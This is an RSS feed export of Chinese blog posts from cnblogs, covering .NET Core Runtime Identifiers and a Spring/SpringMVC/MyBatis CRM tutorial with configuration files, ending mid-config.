<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=feed.cnblogs.com%2Fblog%2Fsitehome%2Frss&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://feed.cnblogs.com/blog/sitehome/rss" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dfeed.cnblogs.com%252Fblog%252Fsitehome%252Frss%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>博客园_首页</title>
<link></link>
<description>代码改变世界</description>
<item>
<title>.NET Core开发日志——Runtime IDentifier - Ken.W</title>
<link>http://www.cnblogs.com/kenwoo/p/9297120.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/kenwoo/p/9297120.html</guid>
<description>&lt;p&gt;.NET Core对于传统.NET开发人员而言是既熟悉又陌生的新平台，所以有时遇上出乎意料的事情也纯属正常情况。这时只需点耐心，多查查资料，努力找到原因，也未尝不是件有意义的体验。&lt;/p&gt;
&lt;p&gt;比如当建完一个最简单的控制台应用程序：&lt;/p&gt;
&lt;pre class=&quot;ps&quot;&gt;
&lt;code&gt;dotnet new console -o helloRID&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;并完成编译后：&lt;/p&gt;
&lt;pre class=&quot;ps&quot;&gt;
&lt;code&gt;dotnet build&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;你在bin目录下会发现生成的程序集是dll文件，而非之前经验里的exe文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/991496/201807/991496-20180711225105405-580422756.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再查下工程文件，输出类型确实是Exe。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/991496/201807/991496-20180711225212637-1363211635.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;是不是感到很意外？&lt;/p&gt;
&lt;p&gt;固然，我们也可以使用&lt;code&gt;dotnet run&lt;/code&gt;的方式获得程序运行的结果，但这样的文件格式绝不是用户所希望的，他们没有办法直接运行该文件。&lt;/p&gt;
&lt;p&gt;问题的缘由很容易借由搜索引擎找到——在编译的时候需要额外指定Runtime IDentifier(运行时标识)。&lt;/p&gt;
&lt;p&gt;Runtime IDentifier的作用是指定应用程序运行时的目标平台。这样就很容易理解了，因为.NET Core支持跨平台，所以在编译时编译器默认并不知道你所想生成的可执行文件是需要在哪个平台上运行的，只有你主动告诉它，才能得到你想要的结果。&lt;/p&gt;
&lt;p&gt;于是运行&lt;code&gt;dotnet build -r osx-x64&lt;/code&gt;(假设你像我一样在macOS系统上运行程序)，可执行文件如预期般出现在bin目录的osx-64文件夹下。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/991496/201807/991496-20180711231623817-813711746.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果是Windows 10系统，则运行&lt;code&gt;dotnet build -r win10-x64&lt;/code&gt;。熟悉的exe文件再次出现。&lt;/p&gt;
&lt;p&gt;更多的Runtime IDentifier可以在微软&lt;a href=&quot;https://docs.microsoft.com/en-us/dotnet/core/rid-catalog&quot;&gt;官网&lt;/a&gt;上找到，这里需要夸一下微软，改进后的官方文档现在越来越好用了。&lt;/p&gt;
</description>
<pubDate>Wed, 11 Jul 2018 15:25:00 +0000</pubDate>
<dc:creator>Ken.W</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/kenwoo/p/9297120.html</dc:identifier>
</item>
<item>
<title>JAVAEE——ssm综合练习：CRM系统（包含ssm整合） - kent鹏</title>
<link>http://www.cnblogs.com/xieyupeng/p/9297264.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xieyupeng/p/9297264.html</guid>
<description>&lt;div class=&quot;Section0&quot;&gt;

&lt;p align=&quot;center&quot;&gt;&lt;strong&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711221704854-307195269.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p align=&quot;center&quot;&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;
&lt;p align=&quot;center&quot;&gt; &lt;/p&gt;
&lt;/div&gt;

&lt;p&gt;IDE&lt;span&gt;：&lt;/span&gt; Eclipse Mars2 &lt;/p&gt;
&lt;p&gt;Jdk: 1.7&lt;/p&gt;
&lt;p&gt;&lt;span&gt;数据库&lt;/span&gt;: MySQL&lt;/p&gt;

&lt;p&gt;&lt;span&gt;数据库&lt;/span&gt;sql&lt;span&gt;文件位置如下图：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711221821970-324115874.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;创建&lt;/span&gt;crm&lt;span&gt;数据库，执行&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711221825674-1199181439.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;效果如下图：&lt;/p&gt;



&lt;p&gt;&lt;span&gt;使用的&lt;/span&gt;Bootstrap&lt;span&gt;前端框架&lt;/span&gt;,&lt;span&gt;官方网站&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;http://www.bootcss.com/&lt;/p&gt;

&lt;p&gt;&lt;span&gt;工程使用&lt;/span&gt;Springmvc&lt;span&gt;、&lt;/span&gt;&lt;span&gt;spring&lt;/span&gt;&lt;span&gt;、&lt;/span&gt;&lt;span&gt;mybatis&lt;/span&gt;&lt;span&gt;框架整合完成。&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;3.1. &lt;strong&gt;&lt;span&gt;需要的&lt;/span&gt;jar&lt;span&gt;包&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;spring&lt;span&gt;（包括&lt;/span&gt;&lt;span&gt;springmvc&lt;/span&gt;&lt;span&gt;）&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;mybatis&lt;/li&gt;
&lt;li&gt;mybatis-spring&lt;span&gt;整合包&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;数据库驱动&lt;/li&gt;
&lt;li&gt;第三方连接池。&lt;/li&gt;
&lt;li&gt;Json&lt;span&gt;依赖包&lt;/span&gt;Jackson&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;jar&lt;span&gt;包位置如下图：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711221839191-1705767332.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;h2&gt;3.2. &lt;strong&gt;整合思路&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Dao&lt;span&gt;层：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1、SqlMapConfig.xml&lt;span&gt;，空文件即可，但是需要文件头。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2、applicationContext-dao.xml&lt;/p&gt;
&lt;p&gt;a) &lt;span&gt;数据库连接&lt;/span&gt;Druid&lt;/p&gt;
&lt;p&gt;b) SqlSessionFactory&lt;span&gt;对象，需要&lt;/span&gt;&lt;span&gt;spring&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;mybatis&lt;/span&gt;&lt;span&gt;整合包下的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;c) &lt;span&gt;配置&lt;/span&gt;mapper&lt;span&gt;文件扫描器。&lt;/span&gt;&lt;span&gt;Mapper&lt;/span&gt;&lt;span&gt;动态代理开发 增强版&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Service&lt;span&gt;层：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1、applicationContext-service.xml&lt;span&gt;包扫描器，扫描&lt;/span&gt;&lt;span&gt;@service&lt;/span&gt;&lt;span&gt;注解的类。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2、applicationContext-trans.xml&lt;span&gt;配置事务。&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;Controller&lt;span&gt;层：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1、Springmvc.xml&lt;/p&gt;
&lt;p&gt;a) &lt;span&gt;包扫描器，扫描&lt;/span&gt;@Controller&lt;span&gt;注解的类。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;b) 配置注解驱动&lt;/p&gt;
&lt;p&gt;c) 配置视图解析器&lt;/p&gt;

&lt;p&gt;Web.xml&lt;span&gt;文件：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;1、&lt;span&gt;配置&lt;/span&gt;spring&lt;span&gt;监听器&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;2、配置前端控制器。&lt;/p&gt;

&lt;h2&gt;3.3. &lt;strong&gt;创建工程&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;创建动态&lt;/span&gt;web&lt;span&gt;工程，步骤如下图：&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711221925274-1635262555.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;创建&lt;/span&gt;boot-crm&lt;span&gt;，如下图&lt;/span&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711221930647-529344978.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;h2&gt;3.4. &lt;strong&gt;&lt;span&gt;加入&lt;/span&gt;jar&lt;span&gt;包&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;加入课前资料中的&lt;/span&gt;jar&lt;span&gt;包&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;3.5. &lt;strong&gt;加入配置文件&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;创建&lt;/span&gt;config&lt;span&gt;资源文件夹，在里面创建&lt;/span&gt;&lt;span&gt;mybatis&lt;/span&gt;&lt;span&gt;和&lt;/span&gt;&lt;span&gt;spring&lt;/span&gt;&lt;span&gt;文件夹&lt;/span&gt;&lt;/p&gt;
&lt;h3&gt;3.5.1. &lt;strong&gt;SqlMapConfig.xml&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;空文件即可&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; &lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE configuration PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;
&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;configuration&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;configuration&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;当然也可以加上包别名，在后面的Mapper xml文件中可以不用写全类名&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;typeAliases&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;package &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;com.xyp.crm.entity&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;typeAliases&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;3.5.2. &lt;strong&gt;applicationContext-dao.xml&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;需要配置：&lt;/p&gt;
&lt;p&gt;&lt;span&gt;加载&lt;/span&gt;properties&lt;span&gt;文件，数据源，&lt;/span&gt;&lt;span&gt;SqlSessionFactory&lt;/span&gt;&lt;span&gt;，&lt;/span&gt;&lt;span&gt;Mapper&lt;/span&gt;&lt;span&gt;扫描&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;beans &lt;/span&gt;&lt;span&gt;xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:context&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;span&gt; xmlns:p&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/p&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:aop&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt;&lt;span&gt; xmlns:tx&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
    xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd
    http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd
    http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util-4.0.xsd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置 读取properties文件 jdbc.properties &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;context:property-placeholder &lt;/span&gt;&lt;span&gt;location&lt;/span&gt;&lt;span&gt;=&quot;classpath:jdbc.properties&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置 数据源 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;bean &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;dataSource&quot;&lt;/span&gt;&lt;span&gt; class&lt;/span&gt;&lt;span&gt;=&quot;com.alibaba.druid.pool.DruidDataSource&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;driverClassName&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;${jdbc.driver}&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;url&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;${jdbc.url}&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;username&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;${jdbc.username}&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;password&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;${jdbc.password}&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;bean&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置SqlSessionFactory &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;bean &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 设置MyBatis核心配置文件 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;configLocation&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;classpath:mybatis/SqlMapConfig.xml&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 设置数据源 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;dataSource&quot;&lt;/span&gt;&lt;span&gt; ref&lt;/span&gt;&lt;span&gt;=&quot;dataSource&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;bean&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置Mapper扫描 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;bean &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 设置Mapper扫描包 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;basePackage&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;cn.itcast.crm.mapper&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;bean&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;beans&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;3.5.3. &lt;strong&gt;j&lt;/strong&gt;&lt;strong&gt;dbc.properties&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;配置数据库信息&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;jdbc.driver=com.mysql.jdbc.Driver
jdbc.url=jdbc:mysql://localhost:3306/crm?characterEncoding=utf-8
jdbc.username=root
jdbc.password=root&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;3.5.4. &lt;strong&gt;log4j.properties&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;配置日志信息&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;# Global logging configuration
log4j.rootLogger=DEBUG, stdout
# Console output...
log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
log4j.appender.stdout.layout.ConversionPattern=%5p [%t] - %m%n&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;3.5.5. &lt;strong&gt;applicationContext-service.xml&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;配置&lt;/span&gt;service&lt;span&gt;扫描&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;beans &lt;/span&gt;&lt;span&gt;xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:context&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;span&gt; xmlns:p&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/p&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:aop&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt;&lt;span&gt; xmlns:tx&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
    xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd
    http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd
    http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util-4.0.xsd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置Service扫描 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;context:component-scan &lt;/span&gt;&lt;span&gt;base-package&lt;/span&gt;&lt;span&gt;=&quot;cn.itcast.crm.service&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;beans&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;3.5.6. &lt;strong&gt;applicationContext-trans.xml&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;配置事务管理：事务管理器、通知、切面&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;beans &lt;/span&gt;&lt;span&gt;xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:context&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;span&gt; xmlns:p&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/p&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:aop&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt;&lt;span&gt; xmlns:tx&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
    xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.0.xsd
    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.0.xsd
    http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.0.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx-4.0.xsd
    http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util-4.0.xsd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 事务管理器 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;bean &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;transactionManager&quot;&lt;/span&gt;&lt;span&gt;    class&lt;/span&gt;&lt;span&gt;=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 数据源 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;dataSource&quot;&lt;/span&gt;&lt;span&gt; ref&lt;/span&gt;&lt;span&gt;=&quot;dataSource&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;bean&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 通知 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:advice &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;txAdvice&quot;&lt;/span&gt;&lt;span&gt; transaction-manager&lt;/span&gt;&lt;span&gt;=&quot;transactionManager&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:attributes&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 传播行为 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;save*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
